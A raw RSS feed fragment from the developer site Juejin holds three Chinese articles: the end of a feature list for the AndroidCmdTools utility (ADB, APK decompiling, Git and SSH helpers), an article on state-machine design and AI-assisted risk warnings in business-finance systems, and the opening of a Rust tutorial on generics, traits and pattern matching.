<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71acbf525bb545d09d913da1bc1fc477~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=9hs%2FrrmISnOSqkImb8dwdEOTs%2Bw%3D" alt="" loading="lazy"/></p>
<ul>
<li>还有很多细分场景，由于时间原因没有列举，需要你自行探索发现。</li>
</ul>
<h4 data-id="heading-2">项目内容</h4>
<ul>
<li>
<p>《设备交互》</p>
<ul>
<li>
<p>《刷机相关》</p>
<ul>
<li>
<p>判断设备是否有锁</p>
</li>
<li>
<p>重启到 fastboot 模式</p>
</li>
<li>
<p>重启到 recovery 模式</p>
</li>
<li>
<p>加载临时的 recovery</p>
</li>
<li>
<p>刷入新的 recovery</p>
</li>
<li>
<p>查看设备机型代号</p>
</li>
</ul>
</li>
<li>
<p>《模拟相关》</p>
<ul>
<li>
<p>模拟文本输入</p>
</li>
<li>
<p>模拟按下电源键</p>
</li>
<li>
<p>模拟按下返回键</p>
</li>
<li>
<p>模拟按下主页键</p>
</li>
<li>
<p>模拟按下多任务键</p>
</li>
<li>
<p>模拟按下菜单键</p>
</li>
<li>
<p>模拟屏幕点击</p>
</li>
</ul>
</li>
<li>
<p>《环境相关》</p>
<ul>
<li>
<p>重启 adb 进程</p>
</li>
<li>
<p>杀死 adb 进程</p>
</li>
<li>
<p>获取当前电脑环境的 adb 版本</p>
</li>
<li>
<p>获取当前电脑环境的 fastboot 版本</p>
</li>
</ul>
</li>
<li>
<p>《硬件相关》</p>
<ul>
<li>
<p>设备关机</p>
</li>
<li>
<p>设备重启</p>
</li>
</ul>
</li>
<li>
<p>《跳转相关》</p>
<ul>
<li>
<p>跳转到指定的 URL</p>
</li>
<li>
<p>跳转到指定的 Activity</p>
</li>
<li>
<p>跳转到开发者选项</p>
</li>
<li>
<p>跳转到关于本机</p>
</li>
<li>
<p>跳转到微信主界面</p>
</li>
</ul>
</li>
<li>
<p>《其他设备操作》</p>
<ul>
<li>
<p>安装应用</p>
</li>
<li>
<p>卸载应用</p>
</li>
<li>
<p>设置全局代理</p>
</li>
<li>
<p>清除全局代理</p>
</li>
<li>
<p>管理设备文件</p>
</li>
<li>
<p>保存截图到电脑</p>
</li>
<li>
<p>保存录屏到电脑</p>
</li>
<li>
<p>开启无线调试</p>
</li>
<li>
<p>断开无线调试</p>
</li>
<li>
<p>获取栈顶 Activity 包名</p>
</li>
<li>
<p>获取栈顶 Activity 内容</p>
</li>
<li>
<p>导出应用 apk</p>
</li>
<li>
<p>导出 ANR 日志</p>
</li>
<li>
<p>清除应用数据</p>
</li>
<li>
<p>杀死应用进程</p>
</li>
<li>
<p>冻结特定应用</p>
</li>
<li>
<p>解冻特定应用</p>
</li>
<li>
<p>授予应用权限</p>
</li>
<li>
<p>撤销应用权限</p>
</li>
<li>
<p>查看屏幕参数</p>
</li>
<li>
<p>查看系统属性</p>
</li>
<li>
<p>查看设备序列号</p>
</li>
<li>
<p>获取设备 CPU 架构</p>
</li>
<li>
<p>跑 MonkeyTest</p>
</li>
<li>
<p>查看设备 Logcat</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>《逆向工具》</p>
<ul>
<li>
<p>《apktool》</p>
<ul>
<li>
<p>用 apktool 反编译 apk</p>
</li>
<li>
<p>用 apktool 回编译 apk</p>
</li>
</ul>
</li>
<li>
<p>《jadx》</p>
<ul>
<li>用 jadx 查看包体</li>
</ul>
</li>
<li>
<p>《jd-gui》</p>
<ul>
<li>用 jd-gui 查看包体</li>
</ul>
</li>
<li>
<p>《格式转换》</p>
<ul>
<li>
<p>《dex 和 class 互转》</p>
<ul>
<li>
<p>dex 转 class</p>
</li>
<li>
<p>class 转 dex</p>
</li>
</ul>
</li>
<li>
<p>《dex 和 smali 互转》</p>
<ul>
<li>
<p>dex 转 smali</p>
</li>
<li>
<p>smali 转 dex</p>
</li>
</ul>
</li>
<li>
<p>《jar 和 dex 互转》</p>
<ul>
<li>
<p>jar 转 dex</p>
</li>
<li>
<p>dex 转 jar</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>《Git 工具》</p>
<ul>
<li>
<p>《推送相关》</p>
<ul>
<li>
<p>强制推送本地分支到远端</p>
</li>
<li>
<p>强制推送本地标签到远端</p>
</li>
</ul>
</li>
<li>
<p>《提交相关》</p>
<ul>
<li>
<p>《修改提交》</p>
<ul>
<li>
<p>修改最后一次提交的消息</p>
</li>
<li>
<p>修改最后一次提交的时间</p>
</li>
<li>
<p>修改最后一次提交的用户名和邮箱</p>
</li>
<li>
<p>修改某一个用户所有已提交的用户名和邮箱</p>
</li>
</ul>
</li>
<li>
<p>《回滚提交》</p>
<ul>
<li>
<p>回退到指定的提交上</p>
</li>
<li>
<p>撤销某一个提交的内容</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>《配置相关》</p>
<ul>
<li>
<p>打开 Git 配置文件</p>
</li>
<li>
<p>一键设置 Git 最佳配置</p>
</li>
<li>
<p>设置 Git 用户名和邮箱</p>
</li>
<li>
<p>设置 Git 文本编码配置</p>
</li>
<li>
<p>设置 Git 文本换行符配置</p>
</li>
<li>
<p>设置 Git 文件权限配置</p>
</li>
</ul>
</li>
<li>
<p>拉取远端 Git 项目到本地</p>
</li>
<li>
<p>为某个目录创建 Git 版本管理</p>
</li>
<li>
<p>用 Git 对比两个文件之间的差异</p>
</li>
</ul>
</li>
<li>
<p>《包体工具》</p>
<ul>
<li>
<p>对 apk 进行签名</p>
</li>
<li>
<p>获取 apk 签名信息</p>
</li>
<li>
<p>support 转 androidx</p>
</li>
<li>
<p>androidx 转 support</p>
</li>
<li>
<p>apk aar jar aab 包体比较</p>
</li>
</ul>
</li>
<li>
<p>《秘钥工具》</p>
<ul>
<li>
<p>查看已有 SSH 公钥</p>
</li>
<li>
<p>创建新的 SSH 密钥</p>
</li>
<li>
<p>删除已有 SSH 密钥</p>
</li>
<li>
<p>打开 SSH 秘钥文件所在的目录</p>
</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3">上车地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FgetActivity%2FAndroidCmdTools" target="_blank" title="https://github.com/getActivity/AndroidCmdTools" ref="nofollow noopener noreferrer">AndroidCmdTools</a></h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[业财系统中的状态机设计与 AI 赋能实践]]></title>    <link>https://juejin.cn/post/7602188264114159631</link>    <guid>https://juejin.cn/post/7602188264114159631</guid>    <pubDate>2026-02-03T07:40:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602188264114159631" data-draft-id="7602161364893073408" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="业财系统中的状态机设计与 AI 赋能实践"/> <meta itemprop="keywords" content="产品,产品经理,资讯"/> <meta itemprop="datePublished" content="2026-02-03T07:40:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Yoo产品"/> <meta itemprop="url" content="https://juejin.cn/user/2791012486624116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            业财系统中的状态机设计与 AI 赋能实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2791012486624116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Yoo产品
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:40:18.000Z" title="Tue Feb 03 2026 07:40:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在 ToB 业财系统中，状态机不是技术细节，而是<strong>业务事实、责任边界与风险控制的核心表达方式</strong>。一套状态设计的好坏，直接决定了系统是否“可控、可信、可扩展”。</p>
</blockquote>
<p>本文将从三个层次展开：</p>
<ol>
<li>为什么业财系统必须用“状态机”思维设计</li>
<li>业财状态机的核心设计方法论</li>
<li>AI 如何真正赋能状态管理，而不是“锦上添花”</li>
</ol>
<hr/>
<h2 data-id="heading-0">一、为什么业财系统离不开状态机</h2>
<h3 data-id="heading-1">1. 业财系统的本质：对业务事实的确认</h3>
<p>与 C 端产品不同，业财系统并不追求“流程顺不顺”，而追求：</p>
<ul>
<li>哪些业务事实已经发生</li>
<li>哪些事实已经被确认、背书</li>
<li>哪些事实已经对账务产生影响</li>
</ul>
<p><strong>状态，本质上就是企业对某个事实的共识声明。</strong></p>
<p>一旦状态变化，意味着：</p>
<ul>
<li>责任主体发生变化（业务 → 财务）</li>
<li>权限发生变化（可编辑 → 不可逆）</li>
<li>风险敞口发生变化（可调整 → 需冲销）</li>
</ul>
<p>因此，业财系统不能只用“流程节点”，而必须用<strong>状态机</strong>来刻画事实的不可逆演进。</p>
<hr/>
<h3 data-id="heading-2">2. 流程图思维的三大陷阱</h3>
<p>很多业财系统的问题，源于用流程图而非状态机设计：</p>
<ul>
<li><strong>只描述路径，不描述约束</strong>： 流程画得很顺，但没有定义“到这一步后还能不能改”。</li>
<li><strong>假设流程线性</strong>： 实际业务中大量存在回退、并行、暂停、人工兜底。</li>
<li><strong>状态与行为耦合</strong>： 每增加一种例外，就新增一个状态，导致状态爆炸。</li>
</ul>
<p>状态机的价值，在于：</p>
<blockquote>
<p>不关心你“怎么走到这里”，只关心你“现在处于什么事实”。</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">二、业财系统状态机的核心设计原则</h2>
<h3 data-id="heading-4">原则一：状态 = 已确认的业务事实</h3>
<p>判断一个状态是否成立，可以问一句话：</p>
<blockquote>
<p>如果审计/财务总监问：<strong>这个状态意味着什么已经确定发生？</strong></p>
</blockquote>
<p>如果答不出来，这个状态就不该存在。</p>
<p><strong>反例</strong>：</p>
<ul>
<li>“处理中”</li>
<li>“流转中”</li>
</ul>
<p><strong>正例</strong>：</p>
<ul>
<li>已履约</li>
<li>已确认收入</li>
<li>已开票</li>
</ul>
<hr/>
<h3 data-id="heading-5">原则二：状态必须绑定责任主体</h3>
<p>每一个业财状态，都应该隐含一个责任归属：</p>
<ul>
<li>业务确认</li>
<li>财务确认</li>
<li>系统自动确认</li>
</ul>
<p>这直接决定了：</p>
<ul>
<li>谁可以发起状态迁移</li>
<li>谁对错误结果负责</li>
</ul>
<blockquote>
<p>没有责任主体的状态，最终一定会变成扯皮现场。</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">原则三：状态变化 ≠ 状态回退</h3>
<p>在业财系统中：</p>
<ul>
<li><strong>回退</strong>通常意味着新的业务事实</li>
<li>而不是“撤销刚才那一步”</li>
</ul>
<p>例如：</p>
<ul>
<li>已确认收入 → 发现错误 → 冲销</li>
</ul>
<p>这里不是“回到未确认”，而是进入一个<strong>新的、可审计的状态</strong>。</p>
<hr/>
<h3 data-id="heading-7">原则四：多维状态优于单一状态</h3>
<p>典型业财对象（订单/项目/合同）往往同时存在：</p>
<ul>
<li>业务状态（是否履约）</li>
<li>财务状态（是否确认收入）</li>
<li>资金状态（是否回款）</li>
</ul>
<p>强行合并成一个 status 字段，只会让规则失控。</p>
<p><strong>正确做法</strong>：</p>
<ul>
<li>主状态 + 多个正交子状态</li>
<li>明确它们之间的约束关系</li>
</ul>
<hr/>
<h2 data-id="heading-8">三、一个典型业财状态机示例</h2>
<p>以“订单到收入确认”为例：</p>
<h3 data-id="heading-9">1. 业务状态（履约维度）</h3>
<ul>
<li>未履约</li>
<li>部分履约</li>
<li>已履约</li>
</ul>
<h3 data-id="heading-10">2. 财务状态（收入维度）</h3>
<ul>
<li>未确认收入</li>
<li>已确认收入</li>
<li>已冲销</li>
</ul>
<h3 data-id="heading-11">3. 资金状态（回款维度）</h3>
<ul>
<li>未回款</li>
<li>部分回款</li>
<li>已回款</li>
</ul>
<p>状态迁移规则不是“随便组合”，而是：</p>
<ul>
<li>未履约 ≠ 已确认收入（除非特殊规则）</li>
<li>已冲销必须有原确认状态</li>
</ul>
<p>这些约束，才是业财系统真正的“规则引擎”。</p>
<hr/>
<h2 data-id="heading-12">四、为什么 AI 特别适合赋能状态管理</h2>
<p>状态管理有三个天然特征，使其非常适合 AI 介入：</p>
<ol>
<li><strong>规则复杂但模式稳定</strong>（大量历史样本）</li>
<li><strong>异常少但风险高</strong>（一旦出错，影响账务）</li>
<li><strong>人工判断依赖经验</strong>（难以规则穷举）</li>
</ol>
<p>AI 的角色，不是取代状态机，而是：</p>
<blockquote>
<p>成为状态机的“第二大脑”。</p>
</blockquote>
<hr/>
<h2 data-id="heading-13">五、AI 赋能业财状态机的四种高价值方式</h2>
<h3 data-id="heading-14">1. AI 状态跃迁风险预警</h3>
<p>在关键状态迁移前，AI 自动校验：</p>
<ul>
<li>金额、比例、历史模式</li>
<li>跨系统状态一致性</li>
</ul>
<p>输出：</p>
<ul>
<li>低风险：自动放行</li>
<li>高风险：提示人工复核</li>
</ul>
<p><strong>核心原则</strong>：</p>
<blockquote>
<p>AI 不做最终确认，只做风险放大器。</p>
</blockquote>
<hr/>
<h3 data-id="heading-15">2. AI 发现“隐性状态”</h3>
<p>通过分析：</p>
<ul>
<li>长时间停滞</li>
<li>高频回退</li>
<li>人工介入密度</li>
</ul>
<p>AI 可以识别：</p>
<ul>
<li>假完成状态</li>
<li>卡审状态</li>
<li>人工兜底状态</li>
</ul>
<p>这些往往是 PM 和管理层最关心、但最难量化的问题。</p>
<hr/>
<h3 data-id="heading-16">3. AI 辅助状态机优化</h3>
<p>AI 可周期性分析：</p>
<ul>
<li>状态停留时长分布</li>
<li>状态跃迁成功率</li>
<li>异常集中点</li>
</ul>
<p>反向给出建议：</p>
<ul>
<li>合并冗余状态</li>
<li>拆分过载状态</li>
<li>调整控制点前移/后移</li>
</ul>
<p>让状态机从“一次性设计”变成“持续演进”。</p>
<hr/>
<h3 data-id="heading-17">4. AI 驱动的状态解释层</h3>
<p>对业务用户而言，状态最大的问题是：</p>
<blockquote>
<p>看得见，但看不懂。</p>
</blockquote>
<p>AI 可以基于当前对象生成自然语言解释：</p>
<ul>
<li>当前状态意味着什么</li>
<li>为什么会到这里</li>
<li>接下来可以/不可以做什么</li>
</ul>
<p>这极大降低了业财系统的使用与培训成本。</p>
<hr/>
<h2 data-id="heading-18">六、给产品经理的三个结论</h2>
<ol>
<li><strong>状态机不是技术问题，而是业务建模能力的体现</strong></li>
<li><strong>所有能影响账务的状态，都必须可解释、可审计、可回溯</strong></li>
<li><strong>AI 的价值，在于让状态管理从“事后纠错”走向“事前预警”</strong></li>
</ol>
<blockquote>
<p>业财系统的成熟度，不在于流程有多复杂，而在于： 当状态变化时，系统是否比人更早意识到风险。</p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rust复合类型高级用法——结构体、枚举与模式匹配进阶]]></title>    <link>https://juejin.cn/post/7602206323460800563</link>    <guid>https://juejin.cn/post/7602206323460800563</guid>    <pubDate>2026-02-03T06:13:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602206323460800563" data-draft-id="7602252722373705779" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rust复合类型高级用法——结构体、枚举与模式匹配进阶"/> <meta itemprop="keywords" content="后端,Rust"/> <meta itemprop="datePublished" content="2026-02-03T06:13:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java水解"/> <meta itemprop="url" content="https://juejin.cn/user/2441349519143037"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rust复合类型高级用法——结构体、枚举与模式匹配进阶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441349519143037/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java水解
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:13:52.000Z" title="Tue Feb 03 2026 06:13:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、学习目标与重点</h3>
<h4 data-id="heading-1"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1.1 学习目标</h4>
<ol>
<li><strong>掌握泛型结构体/枚举</strong>：理解泛型参数在自定义复合类型中的应用，支持类型安全的代码复用</li>
<li><strong>精通trait高级应用</strong>：熟练运用关联类型、默认实现、trait对象（动态分发），掌握对象安全的判断标准</li>
<li><strong>优化模式匹配</strong>：深入学习枚举的嵌套模式匹配、判别式（discriminant）处理，以及结构体的字段匹配</li>
<li><strong>丰富自定义类型功能</strong>：了解派生宏的自定义扩展（如Debug、PartialEq、Clone的高级配置），实现字段验证与序列化反序列化</li>
<li><strong>实战复合类型开发</strong>：结合真实场景编写通用缓存系统、自定义错误类型、HTTP请求解析器，解决复杂业务问题</li>
</ol>
<h4 data-id="heading-2"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1.2 学习重点</h4>
<p>💡 <strong>三大核心难点</strong>：</p>
<ol>
<li><strong>trait对象的动态分发机制</strong>：与泛型的静态分发的区别，以及对象安全的严格条件</li>
<li><strong>关联类型与泛型参数的选择</strong>：关联类型更适合描述“类型家族”关系，泛型参数更适合独立类型参数</li>
<li><strong>嵌套模式匹配的优化</strong>：如何简化多层嵌套的枚举/结构体匹配，避免代码冗余</li>
</ol>
